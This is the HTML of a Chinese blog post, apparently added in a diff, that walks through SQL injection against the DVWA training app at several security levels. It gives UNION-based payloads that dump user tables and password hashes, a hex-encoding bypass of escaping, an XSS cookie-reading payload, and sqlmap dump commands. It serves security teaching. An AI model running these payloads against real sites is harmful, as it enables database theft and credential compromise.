@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>SQL 注入攻击实战 - itw&#39;s blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Mr Wen" /><meta name="description" content="" /><meta name="keywords" content="Linux, Github, Network, Cloud, Python" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.55.4 with even 4.0.0" />
+
+
+<link rel="canonical" href="https://itwhs.github.io/post/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/reset-even.css">
+
+
+<meta property="og:title" content="SQL 注入攻击实战" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itwhs.github.io/post/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/" />
+<meta property="article:published_time" content="2019-04-13T16:15:57&#43;08:00"/>
+<meta property="article:modified_time" content="2019-04-13T16:15:57&#43;08:00"/>
+
+<meta itemprop="name" content="SQL 注入攻击实战">
+<meta itemprop="description" content="">
+
+
+<meta itemprop="datePublished" content="2019-04-13T16:15:57&#43;08:00" />
+<meta itemprop="dateModified" content="2019-04-13T16:15:57&#43;08:00" />
+<meta itemprop="wordCount" content="3078">
+
+
+
+<meta itemprop="keywords" content="dvwa," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL 注入攻击实战"/>
+<meta name="twitter:description" content=""/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">itw</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">首页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于我</li>
+      </a><a href="https://github.com/itwhs/">
+        <li class="mobile-menu-item">GitHub</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">itw</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">首页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于我</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://github.com/itwhs/">GitHub</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">SQL 注入攻击实战</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-04-13 16:15 </span>
+        <div class="post-category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"> 网络安全 </a>
+            </div>
+          <span class="more-meta"> 约 3078 字 </span>
+          <span class="more-meta"> 预计阅读 7 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#5-sql-注入攻击实战">5. SQL 注入攻击实战</a>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#5-1-sql-注入概述">5.1 SQL 注入概述</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#toc_2">　　</a>
+<ul>
+<li>
+<ul>
+<li><a href="#5-2-low-级别-sql-注入实战">5.2 Low 级别 SQL 注入实战</a>
+<ul>
+<li><a href="#5-2-1-手工注入">5.2.1 手工注入</a></li>
+<li><a href="#5-2-2-sqlmap-自动化注入">5.2.2 SQLMap 自动化注入</a></li>
+</ul></li>
+<li><a href="#5-3-medium-级别-sql-注入实战">5.3 Medium 级别 SQL 注入实战</a>
+<ul>
+<li><a href="#5-3-1-手工注入">5.3.1 手工注入</a></li>
+<li><a href="#5-3-2-sqlmap-自动化注入">5.3.2 SQLMap 自动化注入</a></li>
+</ul></li>
+<li><a href="#5-4-high-级别-sql-注入实战">5.4 High 级别 SQL 注入实战</a></li>
+<li><a href="#5-4-impossible-级别-sql-注入">5.4 Impossible 级别 SQL 注入</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="5-sql-注入攻击实战">5. SQL 注入攻击实战</h1>
+
+<h4 id="5-1-sql-注入概述">5.1 SQL 注入概述</h4>
+
+<p>　　所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。它是利用现有应用程序，将（恶意的）SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。</p>
+
+<p>　　SQL 注入一般按照注入方式可以分为普通注入和盲注。普通注入就是注入的页面是直接显示数据库中的字段内容的，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。而盲注则要困难很多，页面并没有直接显示数据库字段内容，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。这种情况下，我们只能全部靠猜。更有甚者，连是否的结果都不显示，我们可能还需要通过返回数据的延迟来判断是否猜对。</p>
+
+<p>　　SQL 注入按照注入的数据类型还可以分为数字型注入和字符型注入。SQL 注入一般都需要利用 Web 站点现有的查询语句。当现有的查询语句 Where 筛选条件匹配的字段是数值类型，那么就是数字型注入；如果匹配的字段是字符类型，那么就是字符型注入。一般字符型注入需要构造单引号用于闭合语法，还需要加入注释符使原本的单引号无效。</p>
+
+<p>　　另外，SQL 注入按照提交参数方式，还可以分为 GET 方式注入、POST 方式注入等等。</p>
+
+<h2 id="toc_2">　　</h2>
+
+<h4 id="5-2-low-级别-sql-注入实战">5.2 Low 级别 SQL 注入实战</h4>
+
+<h5 id="5-2-1-手工注入">5.2.1 手工注入</h5>
+
+<ol>
+<li>设置安全级别为 Low 后，点击 <code>SQL Injection</code> 进入 SQL 注入练习页面。首先在文本框随便输入一个 ID 号，发现可以返回用户信息。同时发现 URL 中出现了提交的参数信息，说明该页面提交方式为 GET，如图 5-1
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617931169723.jpg" alt="img" /></p>
+
+<p>图 5-1</p>
+
+<ol>
+<li>在文本框中输入 <code>1‘</code>，发现页面报错，说明单引号被执行，存在 SQL 注入漏洞，并从报错信息中得知该站点的数据库为 MySQL，如图 5-2，图 5-3
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617932636710.jpg" alt="img" /></p>
+
+<p>图 5-2</p>
+
+<p><img src="../../img/15617932955792.jpg" alt="img" /></p>
+
+<p>图 5-3</p>
+
+<ol>
+<li>在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，都能返回数据，说明可能注入漏洞不是数字型，如图 5-4，图 5-5
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617934685721.jpg" alt="img" /></p>
+
+<p>图 5-4</p>
+
+<p><img src="../../img/15617934930798.jpg" alt="img" /></p>
+
+<p>图 5-5</p>
+
+<ol>
+<li>在文本框输入 <code>1' and 1=1#</code>，可以返回数据，输入 <code>1' and 1=2#</code>，没有数据返回，说明注入成功，确认漏洞为字符型，如图 5-6，图 5-7
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617936717551.jpg" alt="img" /></p>
+
+<p>图 5-6</p>
+
+<p><img src="../../img/15617937427175.jpg" alt="img" /></p>
+
+<p>图 5-7</p>
+
+<ol>
+<li>在文本框输入 <code>1' order by 1</code> 和 <code>1' order by 2</code>，有数据返回，输入 <code>1' order by 3</code>，页面报错，说明本页面只查询了 2 个字段，如图 5-8，图 5-9，图 5-10
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617939925034.jpg" alt="img" /></p>
+
+<p>图 5-8</p>
+
+<p><img src="../../img/15617940271079.jpg" alt="img" /></p>
+
+<p>图 5-9</p>
+
+<p><img src="../../img/15617940601528.jpg" alt="img" /></p>
+
+<p>图 5-10</p>
+
+<ol>
+<li>在文本框输入 <code>1' and 1=2 union select 1,2#</code>，确认页面中 First name 处显示的是记录集中第一个字段，Surname 处显示的是记录集中第二个字段，如图 5-11
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617942853456.jpg" alt="img" /></p>
+
+<p>图 5-11</p>
+
+<ol>
+<li>在文本框输入 <code>1' and 1=2 union select database(),2#</code>，原第一个字段处显示当前数据库名称为 <code>dvwa</code>，如图 5-12
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617950538643.jpg" alt="img" /></p>
+
+<p>图 5-12</p>
+
+<ol>
+<li>在文本框输入 <code>1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>，原第二个字段处显示当前数据库中的所有表名。发现 <code>guestbook</code> 表和 <code>users</code> 表，<code>users</code> 表中极有可能是记录用户名和密码的表，如图 5-13
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617955078723.jpg" alt="img" /></p>
+
+<p>图 5-13</p>
+
+<ol>
+<li>在文本框输入 <code>1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</code>，原第二个字段处显示 <code>users</code> 表中的所有字段名。其中发现 <code>user</code> 和 <code>password</code> 字段，极有可能是用户名和密码字段，如图 5-14
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617957682704.jpg" alt="img" /></p>
+
+<p>图 5-14</p>
+
+<ol>
+<li><p>在文本框输入 <code>1' and 1=2 union select user,password from users#</code>，原第一个字段和第二个字段处分别显示表中的用户名和密码，如图 5-15</p>
+
+<p><img src="../../img/15617959043296.jpg" alt="img" /></p>
+
+<p>图 5-15</p></li>
+
+<li><p>在 <a href="http://www.cmd5.com">http://www.cmd5.com</a> 破解 MD5 加密的密码，即可得到密码明文，如图 5-16</p>
+
+<p><img src="../../img/15617960215647.jpg" alt="img" /></p>
+
+<p>图 5-16</p></li>
+</ol>
+
+<h5 id="5-2-2-sqlmap-自动化注入">5.2.2 SQLMap 自动化注入</h5>
+
+<ol>
+<li>在 Kali 中访问 DVWA ，安全级别设置为 Low，进入 SQL 注入模块，随意输入 ID 值，并复制当前 URL 地址，如图 5-17
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617963082554.jpg" alt="img" /></p>
+
+<p>图 5-17</p>
+
+<ol>
+<li>由于 <code>DVWA</code> 需要登录才能访问该页面，所以使用 <code>SQLMap</code> 工具自动化注入时，需要获取当前的 Cookie 值，我们可以在反射型 XSS 的练习模块中获取当前的 <code>Cookie</code>。点击 <code>XSS Reflected</code>，在文本框中输入 <code>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，提交后即可显示当前 Cookie，如图 5-18
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617965341106.jpg" alt="img" /></p>
+
+<p>图 5-18</p>
+
+<ol>
+<li>复制当前 <code>URL</code> 地址，打开 <code>Kali</code> 的终端，使用 <code>SQLMap</code> 命令 <code>sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' --dbs</code>，可以自动探测出当前数据库名，如图 5-19
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617968983365.jpg" alt="img" /></p>
+
+<p>图 5-19</p>
+
+<ol>
+<li>使用 SQLMap 命令 <code>sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa --table</code>，可以自动探测出 dvwa 数据库中的所有表名，如图 5-20
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617970129029.jpg" alt="img" /></p>
+
+<p>图 5-20</p>
+
+<ol>
+<li>使用 <code>SQLMap</code> 命令 <code>sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa -T users --column</code>，可以自动探测出 users 表中的所有字段名，如图 5-21
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617970950113.jpg" alt="img" /></p>
+
+<p>图 5-21</p>
+
+<ol>
+<li>使用 <code>SQLMap</code> 命令 <code>sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa -T users -C user,password --dump</code>，可以自动探测出用户名和密码内容，并自动 <code>MD5</code> 解密，如图 5-22。中途需要手动输入 <code>Y</code> 进行确认
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617972557446.jpg" alt="img" /></p>
+
+<p>图 5-22</p>
+
+<hr />
+
+<h4 id="5-3-medium-级别-sql-注入实战">5.3 Medium 级别 SQL 注入实战</h4>
+
+<h5 id="5-3-1-手工注入">5.3.1 手工注入</h5>
+
+<ol>
+<li>安全级别设置为 <code>Medium</code> 后，再次进入 <code>SQL</code> 注入模块，发现没有了文本框，随便选择一个 <code>ID</code> 后，可以返回数据，且 <code>URL</code> 上没有显示任何参数，说明该页面为 <code>POST</code> 提交方式。由于页面中没有提供输入信息的接口，所以需要使用 <code>Burpsuite</code> 等工具来构造 <code>POST</code> 包，如图 5-23
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617977072370.jpg" alt="img" /></p>
+
+<p>图 5-23</p>
+
+<ol>
+<li>运行 <code>Burpsuite</code>，并设置好浏览器代理，如图 5-24，图 5-25
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617978008859.jpg" alt="img" /></p>
+
+<p>图 5-24</p>
+
+<p><img src="../../img/15617978521758.jpg" alt="img" /></p>
+
+<p>图 5-25</p>
+
+<ol>
+<li>再次到 SQL 注入页面随便选择一个 ID 值，点击提交，该数据包会被 <code>Burpsuite</code> 拦截并显示，如图 5-26
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617979867982.jpg" alt="img" /></p>
+
+<p>图 5-26</p>
+
+<ol>
+<li>在 ID 值后加入 ' 单引号，并点击 <code>Forward</code> 按钮，浏览器报错，发现同样存在 SQL 注入漏洞，如图 5-27，图 5-28
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617987769226.jpg" alt="img" /></p>
+
+<p>图 5-27</p>
+
+<p><img src="../../img/15617982006479.jpg" alt="img" /></p>
+
+<p>图 5-28</p>
+
+<ol>
+<li>再次随意选择 ID 值，在 <code>Burpsuite</code> 拦截的包中 <code>id=1</code> 后加上 <code>and 1=1</code>，可以返回数据，加上 <code>and 1=2</code>，没有数据返回，确认 <code>SQL</code> 注入点为数字型，如图 5-29，图 5-30，图 5-31，图 5-32
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617989106068.jpg" alt="img" /></p>
+
+<p>图 5-29</p>
+
+<p><img src="../../img/15617989442165.jpg" alt="img" /></p>
+
+<p>图 5-30</p>
+
+<p><img src="../../img/15617990520035.jpg" alt="img" /></p>
+
+<p>图 5-31</p>
+
+<p><img src="../../img/15617990678057.jpg" alt="img" /></p>
+
+<p>图 5-32</p>
+
+<ol>
+<li>再次拦截数据包，加入 <code>and 1=2 union select 1,2</code>，确认页面中 <code>First name</code> 处显示的是记录集中第一个字段，<code>Surname</code> 处显示的是记录集中第二个字段，如图 5-33，图 5-34
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15617992211617.jpg" alt="img" /></p>
+
+<p>图 5-32</p>
+
+<p><img src="../../img/15617992387526.jpg" alt="img" /></p>
+
+<p>图 5-32</p>
+
+<ol>
+<li><p>查询数据库名、表名方法与 <code>Low</code> 级别思路一致，只不过不需要单引号和 <code>#</code> 来闭合语法</p></li>
+
+<li><p>拦截数据包，加入 <code>and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'</code> 来查询字段名时，发现页面报错，如图 5-33，图 5-44</p></li>
+</ol>
+
+<p><img src="../../img/15618160789500.jpg" alt="img" /></p>
+
+<p>图 5-33</p>
+
+<p><img src="../../img/15618161097092.jpg" alt="img" /></p>
+
+<p>图 5-34</p>
+
+<ol>
+<li>先暂时关掉 <code>Burpsuite</code> 的代理功能，在页面中点击 <code>View Source</code>，查看当前源码，发现对提交的 ID 值添加了 <code>mysql_real_escape_string</code> 函数，该函数会对单引号进行转义，从而导致 SQL 语句构造不成功，如图 5-35，图 5-36
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618164277585.jpg" alt="img" /></p>
+
+<p>图 5-35</p>
+
+<p><img src="../../img/15618165182225.jpg" alt="img" /></p>
+
+<p>图 5-36</p>
+
+<ol>
+<li><p>对表名 <code>users</code> 进行 16 进制 HEX 编码，就可以无需使用单引号。<code>users HEX</code> 编码后为 <code>0x7573657273</code>（网上有网站可以对字符进行在线 HEX 编码，可自行搜索）。重新开启 <code>Burpsuite</code> 的代理功能后，在拦截的包中加入 <code>and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273</code>，可以成功查询出字段名，如图 5-37，图 5-38</p>
+
+<p><img src="../../img/15618170208804.jpg" alt="img" /></p>
+
+<p>图 5-37</p>
+
+<p><img src="../../img/15618170542005.jpg" alt="img" /></p>
+
+<p>图 5-38</p></li>
+
+<li><p>拦截数据包，加入 <code>and 1=2 union select user,password from users</code>，可以成功查询出用户名和密码的内容，如图 5-39</p>
+
+<p><img src="../../img/15618172206533.jpg" alt="img" /></p>
+
+<p>图 5-39</p></li>
+</ol>
+
+<h5 id="5-3-2-sqlmap-自动化注入">5.3.2 SQLMap 自动化注入</h5>
+
+<ol>
+<li>使用 <code>SQLMap</code> 自动完成 <code>POST</code> 注入，需要把正常 <code>POST</code> 包的内容复制到一个 <code>txt</code> 文档，再调用文档来进行注入。先使用 <code>Burpsuite</code> 拦截正常 <code>POST</code> 包，右键 - 选择 <code>Copy to file</code> 复制到 <code>/root/post.txt</code>，关闭 <code>Burpsuite</code> 的代理功能，再使用命令 <code>sqlmap -r /root/post.txt --dbs</code>，来查询数据库名称，如图 5-40
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618182311836.jpg" alt="img" /></p>
+
+<p>图 5-39</p>
+
+<p><img src="../../img/15618183044992.jpg" alt="img" /></p>
+
+<p>图 5-40</p>
+
+<p><img src="../../img/15618184176609.jpg" alt="img" /></p>
+
+<p>图 5-41</p>
+
+<ol>
+<li><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa --table</code>，查询表名</p></li>
+
+<li><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users --columns</code>，查询字段名</p></li>
+
+<li><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump</code>，查询用户名和密码内容</p></li>
+</ol>
+
+<hr />
+
+<h4 id="5-4-high-级别-sql-注入实战">5.4 High 级别 SQL 注入实战</h4>
+
+<ol>
+<li>设置安全级别为 <code>High</code>，点开 SQL 注入页面，发现没有输入框，点击 <code>here to change your ID</code>，跳转到新窗口输入查询信息。分离了输入页面和显示结果页面，防止使用 <code>SQLMap</code> 等工具进行自动化注入。同时，确认该页面参数提交方式为 <code>POST</code>，如图 5-42
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618195806056.jpg" alt="img" /></p>
+
+<p>图 5-42</p>
+
+<ol>
+<li>分析页面源码，发现加入了 <code>LIMIT 1</code> 来限制 SQL 语句最多只查询出一条记录，导致无法正使用常规注入手段来爆出数据库中其他内容，如图 5-43
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618197339672.jpg" alt="img" /></p>
+
+<p>图 5-43</p>
+
+<ol>
+<li>在文本框输入 <code>1'</code>，发现页面报错，但是报错内容被替换，无法得知数据库类型，如图 5-44
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618207973326.jpg" alt="img" /></p>
+
+<p>图 5-44</p>
+
+<ol>
+<li>在文本框中输入 <code>1’ and 1=1#</code>，注释掉后面的 <code>LIMIT 1</code> 命令使其无效，可以返回数据，加入 <code>1‘ and 1=2#</code>，没有返回数据，说明仍存在 SQL 注入漏洞，并确认漏洞为字符型，如图 5-45，图 5-46 所示
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618208647554.jpg" alt="img" /></p>
+
+<p>图 5-45</p>
+
+<p><img src="../../img/15618209053140.jpg" alt="img" /></p>
+
+<p>图 5-46</p>
+
+<ol>
+<li>后续注入步骤与 <code>Low</code> 级别思路一致，不再赘述</li>
+</ol>
+
+<hr />
+
+<h4 id="5-4-impossible-级别-sql-注入">5.4 Impossible 级别 SQL 注入</h4>
+
+<p>　　设置安全级别为 <code>Impossible</code>，查看 SQL 注入页面源码，发现使用了 <code>PDO</code> 技术，几乎彻底杜绝了 SQL 注入，如图 5-47
+　　</p>
+
+<p><img src="../../img/15618223549522.jpg" alt="img" /></p>
+
+<p>图 5-47</p>
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Mr Wen</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2019-04-13 16:15
+        
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a target="_blank" rel="license noopener" href="https://github.com/itwhs/itwhs.github.io/blob/master/LICENSE">MIT</a></span>
+  </p>
+</div>
+<div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/img/reward/wechat.png">
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/img/reward/alipay.jpg">
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div><footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/dvwa/">dvwa</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/sql%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">SQL 盲注攻击实战</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/dvwa%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%AE%89%E8%A3%85/">
+            <span class="next-text nav-default">DVWA 简介及安装</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+  
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:itwhs@foxmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://blog.csdn.net/wenhs5479" class="iconfont icon-cnblogs" title="cnblogs"></a>
+      <a href="https://github.com/itwhs" class="iconfont icon-github" title="github"></a>
+  <a href="https://itwhs.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2018 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Mr Wen</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.min.js" integrity="sha256-jwCP0NAdCBloaIWTWHmW4i3snUNMHUNO+jr9rYd2iOI=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.locales.min.js" integrity="sha256-ZwofwC1Lf/faQCzN7nZtfijVV6hSwxjQMwXL4gn9qU8=" crossorigin="anonymous"></script>
+  <script><!-- NOTE: timeago.js uses the language code format like "zh_CN" (underscore and case sensitive) -->
+    var languageCode = "zh-cn".replace(/-/g, '_').replace(/_(.*)/, function ($0, $1) {return $0.replace($1, $1.toUpperCase());});
+    timeago().render(document.querySelectorAll('.timeago'), languageCode);
+    timeago.cancel();  
+  </script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-139425163-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
